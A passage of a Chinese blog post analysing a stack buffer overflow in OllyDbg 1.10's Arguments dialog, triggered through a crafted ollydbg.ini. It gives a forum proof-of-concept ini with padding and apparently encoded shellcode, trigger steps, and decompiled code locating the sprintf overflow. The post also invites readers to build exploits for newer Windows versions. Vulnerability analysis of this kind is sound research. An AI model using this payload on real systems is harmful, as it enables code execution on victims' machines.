class="line">[Arguments]</span><br><span class="line">Executable[1] = </span><br><span class="line">Executable[2] = </span><br><span class="line">Executable[3] = </span><br><span class="line">Executable[4] = </span><br><span class="line">Executable[5] = </span><br><span class="line">Executable[0] = </span><br><span class="line">Argument[1] =&quot;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA譿AAAAAAAAAAAAAAAA?Y?桫OIIIIIIQZVTX630VX4A0B6HH0B30BCVX2BDBH4A2AD0ADTBDQB0ADAVX4Z8BDJOMNOJNFDBPB0BPKXE4N3KXNWE0JGA0ONK8OTJAKHO5BBAPKNIDKHFSKXAPPNA3BLIINJFXBLFWGPALLLM0APDLKNFOKCF5FBF0E7ENK8OUFBAPKNH6KHN0KTKXOENQA0KNKHNQK8APKNIHNUFBF0CLACBLF6K8BTB3EXBLJ7NPKXBDN0KXBGN1MJKHJVJ0KNIPKXBHBKB0BPB0KHJ6NCOUA3HOB6HUI8JOC8BLK7B5JVBOL8F0O5JVJYPOL8P0GUOOGNC6A6NVCVBPZ&quot;&quot;</span><br><span class="line">Argument[2] =sd</span><br><span class="line">Argument[3] =vbn,</span><br><span class="line">Argument[4] =fg</span><br><span class="line">Argument[5] =sss</span><br><span class="line">Argument[0] =溥嗜 琼 皂?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Colours]</span><br><span class="line">Scheme[0] =0,12,8,18,7,8,7,13</span><br><span class="line">Scheme name[0] =Black on white</span><br><span class="line">Scheme[1] =14,12,7,1,3,7,3,13</span><br><span class="line">Scheme name[1] =Yellow on blue</span><br><span class="line">Scheme[2] =1,12,3,11,14,2,7,13</span><br><span class="line">Scheme name[2] =Marine</span><br><span class="line">Scheme[3] =15,12,7,0,8,11,7,13</span><br><span class="line">Scheme name[3] =Mostly black</span><br><span class="line">Scheme[4] =0,12,8,18,7,8,7,13</span><br><span class="line">Scheme name[4] =Scheme 4</span><br><span class="line">Scheme[5] =14,12,7,1,3,7,3,13</span><br><span class="line">Scheme name[5] =Scheme 5</span><br><span class="line">Scheme[6] =1,12,3,11,14,2,7,13</span><br><span class="line">Scheme name[6] =Scheme 6</span><br><span class="line">Scheme[7] =15,12,7,0,8,11,7,13</span><br><span class="line">Scheme name[7] =Scheme 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Fonts]</span><br><span class="line">Font[0] =12,8,400,0,0,0,255,2,49,0</span><br><span class="line">Face name[0] =Terminal</span><br><span class="line">Font name[0] =OEM fixed font</span><br><span class="line">Font[1] =9,6,700,0,0,0,255,0,48,1</span><br><span class="line">Face name[1] =Terminal</span><br><span class="line">Font name[1] =Terminal 6</span><br><span class="line">Font[2] =15,8,400,0,0,0,178,2,49,0</span><br><span class="line">Face name[2] =Fixedsys</span><br><span class="line">Font name[2] =System fixed font</span><br><span class="line">Font[3] =14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[3] =Courier New</span><br><span class="line">Font name[3] =Courier (UNICODE)</span><br><span class="line">Font[4] =10,6,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[4] =Lucida Console</span><br><span class="line">Font name[4] =Lucida (UNICODE)</span><br><span class="line">Font[5] =9,6,700,0,0,0,255,0,48,0</span><br><span class="line">Face name[5] =Terminal</span><br><span class="line">Font name[5] =Font 5</span><br><span class="line">Font[6] =15,8,400,0,0,0,178,2,49,0</span><br><span class="line">Face name[6] =Fixedsys</span><br><span class="line">Font name[6] =Font 6</span><br><span class="line">Font[7] =14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[7] =Courier New</span><br><span class="line">Font name[7] =Font 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Syntax]</span><br><span class="line">Commands[0] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[0] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[0] =No highlighting</span><br><span class="line">Commands[1] =0,4,124,112,9,64,64,13,111,8,12,0,0,0</span><br><span class="line">Operands[1] =1,0,4,13,65,1,112,6,0,0,0,0,0,0</span><br><span class="line">Scheme name[1] =Christmas tree</span><br><span class="line">Commands[2] =0,0,124,112,0,64,64,0,96,0,0,0,0,0</span><br><span class="line">Operands[2] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[2] =Jumps&#x27;n&#x27;calls</span><br><span class="line">Commands[3] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[3] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[3] =Hilite 3</span><br><span class="line">Commands[4] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[4] =0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[4] =Hilite 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Plugin Command line]</span><br><span class="line">Restore command line window = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Plugin Bookmarks]</span><br><span class="line">Restore bookmarks window = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Placement]</span><br><span class="line">OllyTest =486,83,640,480,1</span><br><span class="line">CPU =0,0,514,366,3</span><br><span class="line">CPU subwindows =529,1198,523,1198,320,649,282,649</span><br><span class="line">CPU subwindows 1=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 2=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 3=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 4=374,767,336,658,450,960,388,853</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Appearance]</span><br><span class="line">CPU scheme =0</span><br><span class="line">CPU Disassembler =1,0,0,0,0</span><br><span class="line">CPU Dump =1,0,1,0,4225,0</span><br><span class="line">CPU Stack =1,0,0,0</span><br><span class="line">CPU Info =1,0,0,0</span><br><span class="line">CPU Registers =1,0,1,0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Columns]</span><br><span class="line">CPU Disassembler =54,102,240,1536</span><br><span class="line">CPU Dump =54,144,54,</span><br><span class="line">CPU Stack =54,60,1536,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Plugin IDAFicator]</span><br><span class="line">PATH_RADASM = C:\Users\lenovo\Desktop\ollydbg\ollydbg\plugin\minimalist-radasm</span><br><span class="line">PATH_HELP = C:\Users\lenovo\Desktop\ollydbg\ollydbg\plugin\IDAFICATOR.hlp</span><br><span class="line">DIA_CUSTOMIZE_SCHEME=0,8388608,32768,8421376,128,8388736,32896,12632256,8421504,16711680,65280,16776960,255,16711935,65535,16777215,12639424,15780004,15793151,10789024</span><br><span class="line">SETTINGS_MAIN=0,0,0,0,0</span><br><span class="line">SETTINGS_DUMP=</span><br><span class="line">SETTINGS_DISASM=0,0,0</span><br><span class="line">SETTINGS_STACK=</span><br><span class="line">SETTINGS_HWBP=0,0,0</span><br><span class="line">SETTINGS_ROTE=</span><br><span class="line">LAYOUT_ID=0</span><br><span class="line">LAYOUT_SWAP_DUMP_STACK=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Import libraries]</span><br><span class="line">Implib[0] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42.Lib</span><br><span class="line">Implib[1] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42d.Lib</span><br><span class="line">Implib[2] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42u.Lib</span><br><span class="line">Implib[3] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MFC42ud.Lib</span><br><span class="line">Implib[4] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71.Lib</span><br><span class="line">Implib[5] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71d.Lib</span><br><span class="line">Implib[6] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71u.Lib</span><br><span class="line">Implib[7] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc71ud.Lib</span><br><span class="line">Implib[8] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc80d.Lib</span><br><span class="line">Implib[9] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc80u.Lib</span><br><span class="line">Implib[10] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfc80ud.Lib</span><br><span class="line">Implib[11] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcd42d.Lib</span><br><span class="line">Implib[12] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcd42ud.Lib</span><br><span class="line">Implib[13] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcn42d.Lib</span><br><span class="line">Implib[14] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcn42ud.Lib</span><br><span class="line">Implib[15] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfco42d.Lib</span><br><span class="line">Implib[16] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfco42ud.Lib</span><br><span class="line">Implib[17] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcn42ud.Lib</span><br><span class="line">Implib[18] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MSVBVM50.lib</span><br><span class="line">Implib[19] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvbvm60.lib</span><br><span class="line">Implib[20] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcp60.lib</span><br><span class="line">Implib[21] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcp71.lib</span><br><span class="line">Implib[22] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcp80.lib</span><br><span class="line">Implib[23] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MSVCR70.lib</span><br><span class="line">Implib[24] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcr71.lib</span><br><span class="line">Implib[25] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcr80.lib</span><br><span class="line">Implib[26] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcrt.lib</span><br><span class="line">Implib[27] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\comctl32.lib</span><br><span class="line">Implib[28] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\dbgeng.lib</span><br><span class="line">Implib[29] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\dbghelp.lib</span><br><span class="line">Implib[30] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\kernel32.lib</span><br><span class="line">Implib[31] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\ntdll.lib</span><br><span class="line">Implib[32] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\oleaut32.lib</span><br><span class="line">Implib[33] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\oledlg.lib</span><br><span class="line">Implib[34] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\ollydbg.lib</span><br><span class="line">Implib[35] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\ws2_32.lib</span><br><span class="line">Implib[36] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\wsock32.lib</span><br><span class="line">[Plugin ODbgScript]</span><br><span class="line">MRU1=</span><br><span class="line">MRU2=</span><br><span class="line">MRU3=</span><br><span class="line">MRU4=</span><br><span class="line">MRU5=</span><br><span class="line">Restore Script window=0</span><br><span class="line">Restore Script Log=0</span><br><span class="line">[参数]</span><br><span class="line">Argument[0]=1</span><br><span class="line">[Plugin 中文搜索引擎]</span><br><span class="line">Restore UStrRef Window=0</span><br></pre></td></tr></table></figure></div>

<p>具体操作方法：</p>
<ol>
<li>将 poc 命名为 ollydbg.ini，放在 OD 根目录下面(先备份好原先的文件)</li>
<li>修改 POC [History] 下面的 Executable[0] 参数，填写一个 exe 文件路径</li>
<li>启动原版 OD(如果你使用的是吾爱破解专用版，请打开根目录中的 OllyDBG.EXE)</li>
<li>选择 File ，点击刚刚填写的文件</li>
<li>点击 Debug 选项卡下面的 Arguments 选项，点击那串乱码的参数，点击确定</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ODBUG-1.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ODBUG-2.png"
                     
                ></p>
<p>此时 OD 崩溃，成功触发了漏洞。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据视频中的提示，我们使用 IDA 打开 OD 主程序，漏洞主要在 sub_44150C 函数中。</p>
<p>反编译代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">INT_PTR __stdcall <span class="title function_">sub_44150C</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// ebx@5</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// ebx@12</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// esi@12</span></span><br><span class="line">  CHAR *v7; <span class="comment">// edi@12</span></span><br><span class="line">  CHAR *v8; <span class="comment">// eax@14</span></span><br><span class="line">  CHAR *v9; <span class="comment">// edx@14</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// zf@15</span></span><br><span class="line">  CHAR v11; <span class="comment">// cl@17</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v12; <span class="comment">// ebx@25</span></span><br><span class="line">  CHAR *v13; <span class="comment">// edi@25</span></span><br><span class="line">  <span class="type">const</span> CHAR *v14; <span class="comment">// edx@30</span></span><br><span class="line">  INT_PTR result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">4096</span>]; <span class="comment">// [sp+0h] [bp-19204h]@28</span></span><br><span class="line">  <span class="type">const</span> CHAR *v17; <span class="comment">// [sp+FF0h] [bp-18214h]@26</span></span><br><span class="line">  CHAR ReturnedString[<span class="number">98304</span>]; <span class="comment">// [sp+1000h] [bp-18204h]@6</span></span><br><span class="line">  CHAR KeyName; <span class="comment">// [sp+19000h] [bp-204h]@6</span></span><br><span class="line">  CHAR String; <span class="comment">// [sp+19100h] [bp-104h]@23</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x110</span>u: <span class="comment">// WM_INITDIALOG</span></span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4301</span>, <span class="number">0xC</span>u, <span class="number">0</span>, &amp;byte_4D5A7C);</span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0x155</span>u, <span class="number">1u</span>, <span class="number">0</span>);</span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0x141</span>u, <span class="number">0xFFF</span>u, <span class="number">0</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v4);</span><br><span class="line">        GetPrivateProfileStringA(aArguments, &amp;KeyName, &amp;a08lx_4[<span class="number">5</span>], ReturnedString, <span class="number">0x1000</span>u, FileName);</span><br><span class="line">        <span class="keyword">if</span> ( ReturnedString[<span class="number">0</span>] )</span><br><span class="line">          SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0x143</span>u, <span class="number">0</span>, ReturnedString);<span class="comment">// get args from file then send them to textlist</span></span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v4 &lt; <span class="number">0x18</span> );</span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0xC</span>u, <span class="number">0</span>, &amp;byte_4D5D88);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x111</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0xD</span>u, <span class="number">0x1000</span>u, &amp;byte_4D5D88);</span><br><span class="line">        <span class="keyword">if</span> ( byte_4D5D88 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">0</span>;</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          v7 = ReturnedString;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v5);</span><br><span class="line">            GetPrivateProfileStringA(aArguments, &amp;KeyName, &amp;a08lx_4[<span class="number">5</span>], &amp;ReturnedString[<span class="number">4096</span> * v6], <span class="number">0x1000</span>u, FileName);</span><br><span class="line">            <span class="keyword">if</span> ( *v7 )</span><br><span class="line">            &#123;</span><br><span class="line">              v8 = &amp;ReturnedString[<span class="number">4096</span> * v6];</span><br><span class="line">              v9 = &amp;byte_4D5D88;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                v10 = *v8 == *v9;               <span class="comment">// cmp arg[0] and args[current].</span></span><br><span class="line">                <span class="keyword">if</span> ( *v8 != *v9 )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !*v8 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">                v11 = v8[<span class="number">1</span>];</span><br><span class="line">                v10 = v11 == v9[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( v11 != v9[<span class="number">1</span>] )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v8 += <span class="number">2</span>;</span><br><span class="line">                v9 += <span class="number">2</span>;</span><br><span class="line">                v10 = v11 == <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v11 );</span><br><span class="line">              <span class="keyword">if</span> ( !v10 )</span><br><span class="line">              &#123;</span><br><span class="line">                ++v6;</span><br><span class="line">                v7 += <span class="number">4096</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">LABEL_21:</span><br><span class="line">            ++v5;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v5 &lt; <span class="number">0x18</span> );</span><br><span class="line">          <span class="keyword">if</span> ( byte_4D5D88 == <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;String, aS_9, &amp;byte_4D5D88);</span><br><span class="line">            WritePrivateProfileStringA(aArguments, aArgument0, &amp;String, FileName);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            WritePrivateProfileStringA(aArguments, aArgument0, &amp;byte_4D5D88, FileName);</span><br><span class="line">          &#125;</span><br><span class="line">          v12 = <span class="number">1</span>;</span><br><span class="line">          v13 = ReturnedString;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            v17 = v12;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v12);</span><br><span class="line">            <span class="keyword">if</span> ( v6 &lt; v12 || *v13 != <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = FileName;</span><br><span class="line">              <span class="keyword">if</span> ( v6 &lt; v12 )</span><br><span class="line">                v14 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v14 = &amp;v16[<span class="number">4096</span> * v12];</span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, v14, v17);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">sprintf</span>(&amp;String, aS_9, &amp;v16[<span class="number">4096</span> * v12]);<span class="comment">// overflow?</span></span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, &amp;String, FileName);</span><br><span class="line">            &#125;</span><br><span class="line">            ++v12;</span><br><span class="line">            v13 += <span class="number">4096</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v12 &lt; <span class="number">24</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        EndDialog(hDlg, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        EndDialog(hDlg, <span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x112</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (a3 &amp; <span class="number">0xFFF0</span>) == <span class="number">0xF060</span> )</span><br><span class="line">        EndDialog(hDlg, <span class="number">-1</span>);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对函数查看交叉引用发现有另外一个函数调用了此函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">INT_PTR <span class="title function_">sub_441858</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> DialogBoxParamA(hInstance, aDia_arguments, hWndClient, sub_44150C, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>原来它是一个对话框回调函数，用于处理对话框的消息。</p>
<p>我们主要关注存在漏洞的代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            v17 = v12;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v12);</span><br><span class="line">            <span class="keyword">if</span> ( v6 &lt; v12 || *v13 != <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = FileName;</span><br><span class="line">              <span class="keyword">if</span> ( v6 &lt; v12 )</span><br><span class="line">                v14 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v14 = &amp;v16[<span class="number">4096</span> * v12];</span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, v14, v17);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">sprintf</span>(&amp;String, aS_9, &amp;v16[<span class="number">4096</span> * v12]);<span class="comment">// overflow?</span></span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, &amp;String, FileName);</span><br><span class="line">            &#125;</span><br><span class="line">            ++v12;</span><br><span class="line">            v13 += <span class="number">4096</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v12 &lt; <span class="number">24</span> );</span><br></pre></td></tr></table></figure></div>

<p>此处会从第二个参数开始遍历，最外层是 do while 循环，循环 24 次处理所有参数。</p>
<p>第一个 if 处理两种情况</p>
<ol>
<li>ini 中的参数没有全部处理完毕，并且当前处理的参数开头不是双引号</li>
<li>ini 中的参数处理完毕</li>
</ol>
<p>第一种情况，会正常的取得参数在栈中的地址，然后重新写入 ini 文件。第二种情况把参数地址设置成 0，这样就不会更新 ini 文件了。</p>
<p>因此，当 ini 文件没有全部处理完毕，并且当前处理的参数还是以双引号开头的话，程序就会跑到 else 里面，这里的逻辑就很简单了，直接将参数用 sprintf 函数拷贝到另一个栈中的位置，然后再把它更新到 ini 文件中。</p>
<p>为什么要针对双引号情况单独处理呢？简单查找一下 <strong>GetPrivateProfileString</strong> 在 MSDN 的帮助页面发现如下描述</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If the string associated with lpKeyName is enclosed in single or double quotation marks, the marks are discarded when the GetPrivateProfileString function retrieves the string.</span><br></pre></td></tr></table></figure></div>

<p>如果目标参数的值被单引号或者双引号包裹，那么这些包裹字符将会被自动丢弃。</p>
<p>所以我猜测这里作者默认以双引号开头的参数为空参数，即 “” 这种形态，所以没有xxxx进一步限制参数长度。但是事实证明用户可以通过修改 ini 文件传入畸形的参数即 “”xxxx”” 这样四个双引号构成的字符串，最外层的引号被 API 自动过滤，但是内层还存在引号，并且参数不为空，依然可以进入 sprinf 逻辑中。</p>
<p><strong>IDA 查看 String 参数距离栈底只有 0x104 字节，但是用户能够传入的字符串最大可以达到 0x1000 字节，显然会导致栈溢出。</strong></p>
<p>论坛给出的 POC 是在 XP 下可用的，感兴趣的同学可以考虑构建一下 win7、win10 等系统的 POC。</p>
<p>要注意的是查看系统是否开启 DEP 数据执行保护，win 7 下默认只为系统进程和服务开启，第三方进程默认不开启，可以通过任务管理器进行查看。</p>
<p>虽然第三方程序不开启，但是执行 shellcode 的时候可能会访问到内核的一些数据，或者有其他的操作。不过我对 windows 漏洞利用不是很了解，暂时没有写出可用的POC。</p>
<p>此外，吾爱破解专用版 OD 也是存在这个问题的，只要是 OD 版本为 1.10 基本上都会受到影响，其中中文版 POC 如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[History]</span><br><span class="line">UDD path=C:\Users\lenovo\Desktop\吾爱破解专用版Ollydbg\吾爱破解专用版Ollydbg\UDD</span><br><span class="line">Plugin path=C:\Users\lenovo\Desktop\吾爱破解专用版Ollydbg\吾爱破解专用版Ollydbg\plugin</span><br><span class="line">View file=</span><br><span class="line">View text file=</span><br><span class="line">Object file=</span><br><span class="line">Import library=</span><br><span class="line">Log file=</span><br><span class="line">Run trace file=rtrace.txt</span><br><span class="line">API help file=</span><br><span class="line">Text save file=</span><br><span class="line">Symbolic data path=</span><br><span class="line">Executable[1]=C:\Users\lenovo\Desktop\吾爱破解专用版Ollydbg\吾爱破解专用版Ollydbg\OllyDBG.EXE</span><br><span class="line">Executable[2]=C:\Users\lenovo\Desktop\吾爱破解专用版Ollydbg\吾爱破解专用版Ollydbg\吾爱破解[LCG].exe</span><br><span class="line">Executable[3]=C:\Users\lenovo\Desktop\1.exe</span><br><span class="line">Executable[4]=C:\Users\lenovo\Desktop\reverse2_final.exe</span><br><span class="line">Executable[5]=C:\Users\lenovo\Desktop\packed.exe</span><br><span class="line">Executable[0]=C:\Users\lenovo\Desktop\ollydbg\ollydbg\OllyDBG.EXE</span><br><span class="line">[Settings]</span><br><span class="line">Check DLL versions=0</span><br><span class="line">Show toolbar=1</span><br><span class="line">Status in toolbar=1</span><br><span class="line">Use hardware breakpoints to step=1</span><br><span class="line">Restore windows=2193</span><br><span class="line">Scroll MDI=0</span><br><span class="line">Horizontal scroll=0</span><br><span class="line">Topmost window=0</span><br><span class="line">Index of default font=1</span><br><span class="line">Index of default colours=0</span><br><span class="line">Index of default syntax highlighting=0</span><br><span class="line">Log buffer size index=0</span><br><span class="line">Run trace buffer size index=1</span><br><span class="line">Group adjacent commands in profile=1</span><br><span class="line">Highlighted trace register=-1</span><br><span class="line">IDEAL disassembling mode=0</span><br><span class="line">Disassemble in lowercase=1</span><br><span class="line">Separate arguments with TAB=0</span><br><span class="line">Extra space between arguments=0</span><br><span class="line">Show default segments=1</span><br><span class="line">NEAR jump modifiers=0</span><br><span class="line">Use short form of string commands=0</span><br><span class="line">Use RET instead of RETN=0</span><br><span class="line">Size sensitive mnemonics=1</span><br><span class="line">SSE size decoding mode=0</span><br><span class="line">Top of FPU stack=1</span><br><span class="line">Always show memory size=1</span><br><span class="line">Decode registers for any IP=1</span><br><span class="line">Show symbolic addresses=1</span><br><span class="line">Show local module names=1</span><br><span class="line">Gray data used as filling=1</span><br><span class="line">Show jump direction=1</span><br><span class="line">Show jump path=1</span><br><span class="line">Show jumpfrom path=1</span><br><span class="line">Show path if jump is not taken=1</span><br><span class="line">Underline fixups=1</span><br><span class="line">Center FOLLOWed command=1</span><br><span class="line">Show stack frames=1</span><br><span class="line">Show local names in stack=1</span><br><span class="line">Extended stack trace=1</span><br><span class="line">Synchronize source with CPU=1</span><br><span class="line">Include SFX extractor in code=0</span><br><span class="line">SFX trace mode=0</span><br><span class="line">Use real SFX entry from previous run=1</span><br><span class="line">Ignore SFX exceptions=1</span><br><span class="line">First pause=1</span><br><span class="line">Stop on new 